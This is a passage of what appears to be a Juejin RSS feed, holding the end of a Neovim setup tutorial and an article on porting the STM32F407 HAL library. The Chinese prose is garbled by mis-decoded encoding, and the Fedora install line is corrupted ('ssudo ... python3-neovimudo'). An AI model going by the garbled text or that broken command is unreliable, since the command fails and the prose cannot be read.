<li>å¤„ç†ä»£ç æ£€æŸ¥ã€è¯­æ³•æ£€æŸ¥å’Œæ–‡ä»¶ç´¢å¼•ç­‰ä»»åŠ¡ã€‚</li>
<li>ä¸€ä¸ªå†…ç½®çš„ã€å®Œå…¨å¯è„šæœ¬åŒ–çš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ã€‚</li>
<li>æ”¯æŒå¤§å¤šæ•°ç°æœ‰ Vim æ’ä»¶ã€‚</li>
</ul>
<p>è®©æˆ‘ä»¬æ¥å®‰è£…å’Œé…ç½® Neovimã€‚</p>
<h2 data-id="heading-0">å®‰è£… Neovim</h2>
<p>Neovim å¯ä»¥å®‰è£…åœ¨ Linuxã€macOSï¼ˆä½¿ç”¨ brewï¼‰å’Œ Windows ä¸Šã€‚æ“ä½œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">Windows (via Winget): winget install Neovim.Neovim
macOS (via Brew): brew install neovim
Ubuntu-based distributions: sudo apt-get install neovim -y
Fedora-based distributions: ssudo dnf install -y neovim python3-neovimudo -y
Arch-based distributions: sudo pacman -S neovim
</code></pre>
<p>æ³¨æ„ï¼šè¦ä½¿ç”¨æ’ä»¶ç³»ç»Ÿï¼Œä½ å¿…é¡»å®‰è£…æ¯å¤œç‰ˆï¼ˆç¨åä¼šè¯¦ç»†ä»‹ç»ï¼‰ã€‚</p>
<h2 data-id="heading-1">é…ç½® Neovim</h2>
<p>ä¸€æ—¦å®‰è£…äº† Neovimï¼Œä½ å½“ç„¶å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒã€‚å½“ç„¶ï¼Œè€ƒè™‘åˆ°è¿™ä¸ªå·¥å…·çš„çµæ´»æ€§å’Œå¯æ‰©å±•æ€§ï¼Œä½ ä¼šå¸Œæœ›åˆ›å»ºè‡ªå·±çš„é…ç½®æ–‡ä»¶ã€‚</p>
<p>è¦åˆ›å»ºé…ç½®æ–‡ä»¶ï¼Œä½ å¿…é¡»é¦–å…ˆåˆ›å»ºå¿…è¦çš„ç›®å½•ã€‚æˆ‘å°†åœ¨ Linux ä¸Šæ¼”ç¤ºè¿™ä¸€ç‚¹ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ macOS æˆ– Windowsï¼Œä½ éœ€è¦ç›¸åº”åœ°æ›´æ”¹é…ç½®æ–‡ä»¶çš„ä½ç½®ã€‚</p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºæ–°ç›®å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> ~/.config/nvim
</code></pre>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºé…ç½®æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nano ~/.config/nvim/init.vim
</code></pre>
<p>åœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œä½ å°†æ·»åŠ æ‰€æœ‰é…ç½®é€‰é¡¹ã€‚ä¸€ä¸ªç¤ºä¾‹é…ç½®å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">set</span> nocompatible                 <span class="hljs-string">" disables compatibility with old-time vi
set showmatch                    "</span> shows matching
<span class="hljs-built_in">set</span> ignorecase                     <span class="hljs-string">" case insensitive
set mouse=v                        "</span> middle-click <span class="hljs-built_in">paste</span> with
<span class="hljs-built_in">set</span> hlsearch                         <span class="hljs-string">" highlight search
set incsearch                        "</span> incremental search
<span class="hljs-built_in">set</span> tabstop=4                        <span class="hljs-string">" number of columns occupied by a tab
set softtabstop=4                  "</span> see multiple spaces as tabstops so &lt;BS&gt; does the right thing
<span class="hljs-built_in">set</span> expandtab                       <span class="hljs-string">" converts tabs to white space
set shiftwidth=4                     "</span> width <span class="hljs-keyword">for</span> autoindents
<span class="hljs-built_in">set</span> autoindent                       <span class="hljs-string">" indents a new line the same amount as the line just typed
set number                           "</span> adds line numbers
<span class="hljs-built_in">set</span> wildmode=longest,list     <span class="hljs-string">" gets bash-like tab completions
set cc=80                             "</span> sets an 80-column border <span class="hljs-keyword">for</span> good coding style
filetype plugin indent on       <span class="hljs-string">"allows auto-indenting depending on file type
syntax on                             "</span> enables syntax highlighting
<span class="hljs-built_in">set</span> mouse=a                       <span class="hljs-string">" enables mouse click
set clipboard=unnamedplus "</span> uses system clipboard
filetype plugin on
<span class="hljs-built_in">set</span> cursorline                      <span class="hljs-string">" highlights current cursorline
set ttyfast                            "</span> Speeds up scrolling <span class="hljs-keyword">in</span> Vim
<span class="hljs-string">" set spell                            "</span> enables spell check (may need to download language package)
<span class="hljs-string">" set noswapfile                  "</span> disables creating swap file
<span class="hljs-string">" set backupdir=~/.cache/vim "</span> Directory to store backup files.
</code></pre>
<p>ä½ å¯ä»¥åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fneovim.io%2Fdoc%2Fuser%2Foptions.html" target="_blank" title="https://neovim.io/doc/user/options.html" ref="nofollow noopener noreferrer">Neovim æ–‡æ¡£</a>ä¸­æ‰¾åˆ°å®Œæ•´çš„é€‰é¡¹åˆ—è¡¨ã€‚</p>
<p>åˆ›å»ºé…ç½®æ–‡ä»¶åï¼ŒæŒ‰ Ctrl+X ä¿å­˜ã€‚</p>
<h2 data-id="heading-2">æ’ä»¶</h2>
<p>Neovim å¯ä»¥ä½¿ç”¨ vim-plug ä½œä¸ºæ’ä»¶ç®¡ç†å™¨ã€‚å”¯ä¸€çš„é—®é¢˜æ˜¯ï¼Œé™¤éä½ ä½¿ç”¨æ¯å¤œæ„å»ºç‰ˆï¼ˆå¯ä»¥åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fneovim%2Fneovim" target="_blank" title="https://github.com/neovim/neovim" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>æ‰¾åˆ°ï¼‰ï¼Œå¦åˆ™è®¸å¤šæ’ä»¶æ— æ³•æ­£å¸¸è¿è¡Œã€‚</p>
<p>è¦åœ¨ Ubuntu ä¸Šå®‰è£…æ¯å¤œç‰ˆï¼Œè¯·éµå¾ªä»¥ä¸‹æ­¥éª¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo add-apt-repository ppa:neovim-ppa/unstable
sudo apt-get update
sudo apt-get install neovim -y
</code></pre>
<p>å®Œæˆè¿™äº›åï¼Œå®‰è£… vim-plugï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
</code></pre>
<p>ç°åœ¨è¿™äº›æ­¥éª¤éƒ½å·²å®Œæˆï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå°æŠ€å·§è®©äº‹æƒ…å˜å¾—æ›´å®¹æ˜“ã€‚æœ‰ä¸€ä¸ªåä¸º Kickstarter çš„è„šæœ¬ï¼Œå¯ä»¥éå¸¸è½»æ¾åœ°è®¾ç½® Neovimã€‚è¦ä½¿ç”¨ Kickstarterï¼Œä½ éœ€è¦å°† <code>init.vim</code> æ–‡ä»¶ä» nvim ç›®å½•ä¸­ç§»å‡ºï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/nvim-lua/kickstart.nvim.git <span class="hljs-string">"<span class="hljs-variable">${XDG_CONFIG_HOME:-<span class="hljs-variable">$HOME</span>/.config}</span>"</span>/nvim
</code></pre>
<p>ä¹‹åï¼Œå¯åŠ¨ Neovim ä»¥åŠ è½½ Kickstarterã€‚è¿è¡Œåº”ç”¨ç¨‹åºçš„å‘½ä»¤æ˜¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nvim
</code></pre>
<p>ä¸€æ—¦åŠ è½½å®Œæˆï¼Œä½ å°±ä¼šè¿›å…¥ Neovim çª—å£ï¼Œåœ¨é‚£é‡Œä½ å¯ä»¥å¼€å§‹ä½¿ç”¨ç¼–è¾‘å™¨ã€‚</p>
<p>è¦åŠ è½½æ’ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>:packadd</code> å‘½ä»¤ï¼Œåƒè¿™æ ·ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">:packadd nvim.difftool
</code></pre>
<p>ä¹‹åï¼Œä½ å°±å¯ä»¥åƒè¿™æ ·è°ƒç”¨æ’ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">:DiffTool {left} {right}
</code></pre>
<p>DiffTool æ’ä»¶å¯ä»¥å¹¶æ’æ¯”è¾ƒä¸¤ä¸ªç›®å½•æˆ–æ–‡ä»¶ï¼Œå¹¶æ”¯æŒç›®å½•å·®å¼‚ã€é‡å‘½åæ£€æµ‹å’Œé«˜äº®æ˜¾ç¤ºæ›´æ”¹ã€‚</p>
<h2 data-id="heading-3">ä½¿ç”¨å†…ç½®æ•™ç¨‹</h2>
<p>æ­¤æ—¶ï¼Œæˆ‘å¼ºçƒˆå»ºè®®ä½ ä½¿ç”¨äº¤äº’å¼æ•™ç¨‹ï¼Œå®ƒå°†æå¤§åœ°å¸®åŠ©ä½ å…¥é—¨ Neovimã€‚è¦å¼€å§‹æ•™ç¨‹ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é€€å‡º Neovimï¼š</p>
<pre><code class="hljs language-bash" lang="bash">:q
</code></pre>
<p>å›åˆ°ä½ çš„ç»ˆç«¯çª—å£ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nvim +Tutor
</code></pre>
<p>è¿™ä¸ªäº¤äº’å¼æ•™ç¨‹å°†çœŸæ­£å¸®åŠ©ä½ ç†è§£å¦‚ä½•å¿«é€Ÿä¸Šæ‰‹ Neovimï¼Œé‰´äºæœ‰å¾ˆå¤šä¸œè¥¿éœ€è¦å­¦ä¹ ï¼Œè¿™å¯¹äºä»»ä½•åˆšå¼€å§‹çš„äººæ¥è¯´ç»å¯¹æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p>
<p>è¯´çœŸçš„ï¼Œè¿™ä¸ªæ•™ç¨‹æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p>
<p>Neovim æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œé€šè¿‡ä¸€äº›å‰æœŸé…ç½®ï¼Œå®ƒå¯ä»¥å–ä»£ä½ å½“å‰çš„ç¼–ç¨‹ç¼–è¾‘å™¨ï¼Œç”šè‡³æ›´å¤šã€‚æ˜¯çš„ï¼Œå®ƒæœ‰é™¡å³­çš„å­¦ä¹ æ›²çº¿ï¼Œä½†å†…ç½®æ•™ç¨‹å°†å¤§å¤§å¸®åŠ©ä½ ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨å®é™…é¡¹ç›®ä¸­ç§»æ¤å¹¶é…ç½®halåº“]]></title>    <link>https://juejin.cn/post/7589838742552526867</link>    <guid>https://juejin.cn/post/7589838742552526867</guid>    <pubDate>2026-01-01T10:35:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838742552526867" data-draft-id="7589916567875715114" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨å®é™…é¡¹ç›®ä¸­ç§»æ¤å¹¶é…ç½®halåº“"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2026-01-01T10:35:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åµŒå…¥å¼å¤§å¤´"/> <meta itemprop="url" content="https://juejin.cn/user/124713977526552"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨å®é™…é¡¹ç›®ä¸­ç§»æ¤å¹¶é…ç½®halåº“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/124713977526552/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åµŒå…¥å¼å¤§å¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:35:14.000Z" title="Thu Jan 01 2026 10:35:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸‹å›¾æ˜¯æˆ‘é¡¹ç›®çš„ç›®å½•ç»“æ„ï¼Œå…³äºç›®å½•è®¾è®¡æ€æƒ³ï¼Œè¿™é‡Œä¸å±•å¼€æè¿°ï¼Œåªè®²è§£å¦‚ä½•å°†<code>hal</code>åº“ç§»æ¤åˆ°è¯¥é¡¹ç›®ä¸­å¹¶é…ç½®ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ed91f49a1b945a9980f3e78100640e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bWM5YWl5byP5aSn5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767868513&amp;x-signature=qzbhfERiKPXOip%2FU35naJ8Ncmy0%3D" alt="image.png" loading="lazy"/></p>
<p>é¦–å…ˆå…ˆæ˜ç¡® <code>HAL</code> ç§»æ¤çš„â€œæœ€å°é—­ç¯â€éœ€è¦å“ªäº›æ–‡ä»¶(ä»¥<code>STM32F407</code>ä¸ºä¾‹)ï¼š</p>
<ol>
<li>
<p><code>CMSIS</code> + <code>STM32F4xx_HAL_Driver</code></p>
<blockquote>
<p><code>CMSIS</code>ç»™ <code>ARM Cortexâ€‘M</code> å†…æ ¸ + <code>STM32</code> è®¾å¤‡æä¾›â€œæœ€åº•å±‚ç»Ÿä¸€æ¥å£/å¤´æ–‡ä»¶/å¯åŠ¨æ¨¡æ¿â€
<code>STM32F4xx_HAL_Driver</code> æ˜¯ <code>ST</code> çš„ <code>HAL</code> é©±åŠ¨åº“</p>
</blockquote>
</li>
<li>
<p>ä¸‰ä»¶å¥—ï¼š<code>startup / system / linker</code>ï¼š</p>
<ul>
<li><code>startup_stm32f407xx.s</code></li>
</ul>
<blockquote>
<p>MCU ä¸Šç”µå¤ä½åæ‰§è¡Œçš„ç¬¬ä¸€æ®µä»£ç </p>
</blockquote>
<ul>
<li><code>system_stm32f4xx.c</code></li>
</ul>
<blockquote>
<p>èŠ¯ç‰‡çº§ç³»ç»Ÿåˆå§‹åŒ–ä¸å…¨å±€æ—¶é’Ÿå˜é‡ç»´æŠ¤</p>
</blockquote>
<ul>
<li><code>app.ld</code></li>
</ul>
<blockquote>
<p>å‘Šè¯‰é“¾æ¥å™¨ <code>Flash/RAM/CCMRAM</code> çš„åœ°å€ä¸å¤§å°å’Œå„å†…å­˜æ®µ(<code>.isr_vector/.text/.rodata/.data/.bss</code>)çš„ä½
ç½®ï¼Œå¹¶å¯¼å‡ºå¯åŠ¨æ–‡ä»¶éœ€è¦çš„ç¬¦å·(<code>_estack/_sidata/_sdata/_edata/_sbss/_ebss</code>)</p>
</blockquote>
</li>
<li>
<p><code>stm32f4xx_hal_conf.h</code></p>
<blockquote>
<p><code>HAL</code> çš„â€œç¼–è¯‘æœŸé…ç½®å¼€å…³â€ï¼Œå†³å®šï¼š</p>
<ul>
<li>å¼€å¯å“ªäº› <code>HAL</code> æ¨¡å—ï¼ˆ<code>GPIO/UART/RCC/SDIO/FSMC</code>â€¦ï¼‰</li>
<li>æ—¶é’Ÿå‚æ•°ï¼ˆä¾‹å¦‚Â <code>HSE_VALUE</code>ï¼‰</li>
<li>æ–­è¨€/å›è°ƒç­‰é€‰é¡¹</li>
</ul>
</blockquote>
</li>
<li>
<p><code>stm32f4xx_it.c/.h</code></p>
<blockquote>
<p>å®ç°â€œä¸­æ–­å…¥å£å‡½æ•°â€</p>
</blockquote>
</li>
<li>
<p><code>stm32f4xx_hal_msp.c</code></p>
<blockquote>
<p>å®ç° <code>HAL</code> æä¾›çš„â€œç¡¬ä»¶ç›¸å…³å›è°ƒï¼ˆé’©å­ï¼‰â€</p>
</blockquote>
</li>
</ol>
<p>å…³äºæœ¬é¡¹ç›®<code>hal</code>ç§»æ¤ï¼Œæˆ‘å°†å…¶åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p>
<ul>
<li><code>external/st</code>(åŸå§‹ä»£ç )ï¼šåŒ…æ‹¬<code>CMSIS</code> å’Œ <code>STM32F4xx_HAL_Driver</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/437105b65b324a6f9efe27f755ee4d75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bWM5YWl5byP5aSn5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767868513&amp;x-signature=cz8m%2F3Nh0kht3J%2Fnw5M0qlQndMU%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><code>platform</code>(èŠ¯ç‰‡çº§)ï¼šåŒ…æ‹¬<code>startup_stm32f407xx.s</code> å’Œ <code>system_stm32f4xx.c</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8dfa7f18f84241a89aee4aef0f5cd100~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bWM5YWl5byP5aSn5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767868513&amp;x-signature=ednFIoP0zajlMaFzoH7WqmtnGk0%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><code>applications</code>(äº§ç‰©çº§): åŒ…æ‹¬<code>app.ld</code>ã€<code>stm32f4xx_hal_conf.h</code>ã€<code>stm32f4xx_it.c/.h</code>ã€<code>stm32f4xx_hal_msp.c</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a09f85517dde4532b492d9ed4364d3e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bWM5YWl5byP5aSn5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767868513&amp;x-signature=TYI%2FB0HoAiVde2y1uTr9sviZwHo%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨å®Œæˆæ–‡ä»¶ç§»æ¤åè¿˜éœ€è¦è¿›è¡Œä¸€äº›é…ç½®ï¼š</p>
<ul>
<li><code>HAL</code> é…ç½®æ–‡ä»¶<code>stm32f4xx_hal_conf.h</code>ï¼Œå¿…é¡»æ­£ç¡®é…ç½®ï¼š
<ul>
<li><code>HSE_VALUE</code>ï¼ˆæ¿å­å¤–éƒ¨æ™¶æŒ¯é¢‘ç‡ï¼Œé”™äº† <code>PLL</code> ä¼šå¤±è´¥ï¼‰</li>
<li>å¯ç”¨ç”¨åˆ°çš„ <code>HAL</code> æ¨¡å—å®ï¼ˆä¾‹å¦‚ <code>GPIO/RCC/PWR</code>â€¦ï¼‰</li>
</ul>
</li>
<li>é…ç½®<code>stm32f4xx_it.c/.h</code>ï¼Œè‡³å°‘å®ç°ï¼š
<ul>
<li><code>SysTick_Handler()</code>ï¼šè°ƒç”¨Â <code>HAL_IncTick()</code>(å»ºè®®å†è°ƒç”¨Â <code>HAL_SYSTICK_IRQHandler()</code>)</li>
</ul>
</li>
</ul>
<p>è‡³æ­¤<code>hal</code>åº“çš„ç§»æ¤å’Œé…ç½®éƒ½å·²å®Œæˆï¼Œä½†è¦æƒ³ä½¿é¡¹ç›®è¿è¡Œèµ·æ¥ï¼Œåœ¨<code>Keil</code>æˆ–å…¶ä»–<code>IDE</code>è½¯ä»¶ä¸­å†é…ç½®ä¸€ä¸‹ç¼–è¯‘å™¨ã€ç¼–è¯‘è·¯å¾„ç­‰ï¼ŒåŸºæœ¬å°±å¯ä»¥ç”¨äº†ï¼Œå¦‚æœåªæƒ³ç”¨<code>vscode</code>è¿›è¡Œå¼€å‘ï¼Œå¯ä»¥é…ç½®å¤–éƒ¨ç¼–è¯‘å™¨<code>arm-none-eabi-gcc</code>,å¹¶ç”¨<code>cmake</code>å’Œ<code>ninja</code>ç»„ç»‡å’Œæ„å»ºç¼–è¯‘ï¼Œå†ç”¨<code>openocd</code>+ä»»æ„ä»¿çœŸå™¨ä¸‹è½½ç¨‹åºå³å¯ï¼Œå¦‚æœæœ‰æƒ³äº†è§£<code>vscode</code>+<code>arm-gcc</code>+<code>cmake</code>+<code>ninja</code>+<code>openocd</code>è¿™å¥—å¼€å‘æµç¨‹çš„(<strong>å…¨é“¾æ¡å¼€æºã€é«˜æ•ˆä¸”é«˜åº¦å¯å®šåˆ¶ï¼Œå¯è·¨å¹³å°</strong>)ï¼Œå¯ä»¥ç•™è¨€ï¼Œå¦‚æœè¶…è¿‡ä¸‰ä¸ªäººï¼Œæˆ‘å°±å‡ºä¸€æœŸæ•™ç¨‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é«˜æ•ˆçš„çº¿æ€§é‡‡æ ·é«˜æ–¯æ¨¡ç³Š]]></title>    <link>https://juejin.cn/post/7589897523269320714</link>    <guid>https://juejin.cn/post/7589897523269320714</guid>    <pubDate>2026-01-01T10:48:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589897523269320714" data-draft-id="7589897523269304330" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é«˜æ•ˆçš„çº¿æ€§é‡‡æ ·é«˜æ–¯æ¨¡ç³Š"/> <meta itemprop="keywords" content="JavaScript,WebGL"/> <meta itemprop="datePublished" content="2026-01-01T10:48:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¸©å®‡é£"/> <meta itemprop="url" content="https://juejin.cn/user/4300945219403368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é«˜æ•ˆçš„çº¿æ€§é‡‡æ ·é«˜æ–¯æ¨¡ç³Š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4300945219403368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¸©å®‡é£
